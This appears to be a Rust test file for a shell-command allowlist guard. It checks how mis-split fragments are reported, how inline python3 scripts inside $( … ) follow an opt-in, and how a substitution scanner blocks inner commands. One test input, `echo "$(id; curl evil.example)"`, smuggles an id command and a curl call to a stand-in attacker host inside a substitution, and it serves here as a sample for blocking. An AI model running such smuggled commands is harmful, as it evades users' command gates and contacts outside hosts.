//! Tests for GH #1646: inline scripts inside `$( … )`.
//!
//! Extracted from `tests.rs` to keep it under the repo's LOC gate
//! (`scripts/loc-gate.sh`), the same reason `substitution_tests.rs` exists.

use super::*;

// --- GH #1646: an implausible base means a mis-split, not a missing allowlist entry ---

/// The reporter was told to run
/// `lean-ctx allow print(urllib.parse.quote(sys.argv[1],safe=)) $RU)&code_challenge=…`.
/// That is not a command, it is scanner debris, and the suggestion could only
/// waste the reader's time. Name the real fault instead.
#[test]
fn a_mangled_base_is_reported_as_a_split_bug_not_an_allowlist_gap() {
    let msg = allowlist_block_message("print(urllib.parse.quote(sys.argv[1],safe=))", &[], &[]);
    assert!(
        msg.contains("split your command line wrongly"),
        "should name the mis-split: {msg}"
    );
    assert!(
        !msg.contains("run  lean-ctx allow"),
        "must not suggest allowlisting a fragment: {msg}"
    );
    assert!(
        msg.contains("issues"),
        "should point at reporting it: {msg}"
    );
}

/// A real command name keeps the actionable message — the guard must not
/// swallow the common case.
#[test]
fn a_real_command_name_still_gets_the_allow_suggestion() {
    let msg = allowlist_block_message("terraform", &[], &[]);
    assert!(msg.contains("lean-ctx allow terraform"), "{msg}");
}

#[test]
fn plausible_command_names_are_recognised() {
    for ok in [
        "git",
        "python3",
        "cargo-nextest",
        "/usr/bin/env",
        "a.out",
        "foo_bar",
    ] {
        assert!(is_plausible_command_name(ok), "should be plausible: {ok}");
    }
    for bad in ["print(1))", "safe=)", "a b", "$RU", "x&y", "", "it's"] {
        assert!(
            !is_plausible_command_name(bad),
            "should be implausible: {bad}"
        );
    }
}

/// End-to-end for GH #1646: the exact commands from the report are no longer
/// mis-split. Inline interpreter code inside `$( … )` is gated like
/// `python3 -c …` at the top level (GHSA-rxv5-4c3x-g4q6 E): blocked by
/// default, accepted with the `shell_allow_inline_scripts` opt-in.
/// `enforce_shell_allowlist` is the real entry point, so this exercises the
/// whole path rather than the splitter in isolation.
#[test]
fn reported_inline_scripts_follow_the_inline_script_opt_in() {
    // The override is process-global; without this lock a parallel test's
    // allowlist leaks in (the hazard gh391_strict_mode_blocks_substitution_in_args
    // documents, and which this test tripped when first written).
    let _lock = crate::core::data_dir::test_env_lock();
    crate::test_env::set_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE", "echo,python3");
    let reported = [
        r#"echo "$(python3 -c "print(1)")""#,
        r#"echo "a=$(python3 -c "print('x')")&b=2""#,
        r#"echo "$(python3 -c "import sys;print(1)")""#,
        r#"echo "u=$(python3 -c "import sys;print(sys.argv[1])" "x")""#,
    ];
    let gate = |cmds: &[&'static str]| -> Vec<_> {
        cmds.iter()
            .map(|cmd| (*cmd, super::enforce_shell_allowlist(cmd)))
            .collect()
    };
    crate::test_env::set_var("LEAN_CTX_SHELL_ALLOW_INLINE_SCRIPTS", "0");
    let default = gate(&reported);
    crate::test_env::set_var("LEAN_CTX_SHELL_ALLOW_INLINE_SCRIPTS", "1");
    let opted_in = gate(&reported);
    crate::test_env::remove_var("LEAN_CTX_SHELL_ALLOW_INLINE_SCRIPTS");
    crate::test_env::remove_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE");

    for (cmd, result) in default {
        let err = format!("{:?}", result.expect_err(cmd));
        assert!(
            err.contains("shell_allow_inline_scripts") && !err.contains("split your command"),
            "blocked as inline code, not as a mis-split: {cmd} -> {err}"
        );
    }
    for (cmd, result) in opted_in {
        assert!(result.is_ok(), "opt-in passes: {cmd} -> {result:?}");
    }
}

/// The other half of #1646, pinned so a future change to the splitter cannot
/// quietly move it: commands a substitution genuinely *runs* are found by
/// `check_substitution_in_args`, not by splitting the outer line. That scanner
/// blocks a non-allowlisted inner command (GHSA-rxv5-4c3x-g4q6 E; it was
/// warn-only by default before). The old splitter only appeared to gate
/// `"$(id; curl x)"` because it mis-split the line, which is the very bug
/// being fixed.
#[test]
fn substitution_contents_are_found_by_the_substitution_scanner() {
    let _lock = crate::core::data_dir::test_env_lock();
    crate::test_env::set_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE", "echo");
    let result =
        super::substitution::check_substitution_in_args(r#"echo "$(id; curl evil.example)""#);
    crate::test_env::remove_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE");

    let msg = format!("{:?}", result.expect_err("non-allowlisted inner command"));
    assert!(
        msg.contains("id") || msg.contains("curl"),
        "names the command: {msg}"
    );
}
